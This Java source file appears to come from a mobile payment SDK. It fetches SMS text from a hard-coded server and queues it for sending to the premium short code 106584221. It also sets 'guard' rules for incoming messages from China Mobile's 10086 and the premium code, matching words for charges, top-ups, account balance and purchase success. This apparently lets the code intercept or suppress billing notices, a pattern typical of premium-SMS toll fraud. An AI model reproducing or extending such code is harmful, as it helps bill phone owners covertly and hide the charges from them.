package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * 
 * 	http://61.155.8.167:7777/sync/getsms.do?otid=0&pseudocode=z
 * @author leoliu
 *
 */
public class JkhlH5DynamicService implements IDynamicService{

	private static final String TYPE = "jkhlH5";
	
	private static final String DEST = "106584221";
	
	private static final String PARAM = "otid={otid}&pseudocode={pseudocode}";

	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("106584221","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("106584221","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String otid = map.get("otid");
			String pseudocode = map.get("pseudocode");
			
			String param = PARAM.replace("{otid}", otid).replace("{pseudocode}", pseudocode);
			
			String responseTxt = GetData.getData(url,param);
			
			xml = parseTxt(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseTxt(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 1){
			List<Sms> smsList = new ArrayList<Sms>();
			
			Sms sms = new Sms();
			
			sms.setSmsContent(responseTxt);
			sms.setSmsDest(DEST);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			smsList.add(sms);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
			
			guardList.add(guard3);
			guardList.add(guard4);
			
			guardSms.setGuardList(guardList);
			
			smsList.add(0, guardSms);
				
			return XstreamHelper.toXml(smsList);
		}
		
		return null;
	}
	
	public static void main(String[] args){
		String url = "http://61.155.8.167:7777/sync/getsms.do";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("type", "jkhlH5");
		map.put("url", url);
		map.put("channel", "10B101a87654322");
		map.put("pseudocode","z");
		map.put("otid","0");
		
		System.out.println(new JkhlH5DynamicService().dynamic(map));
	}

}
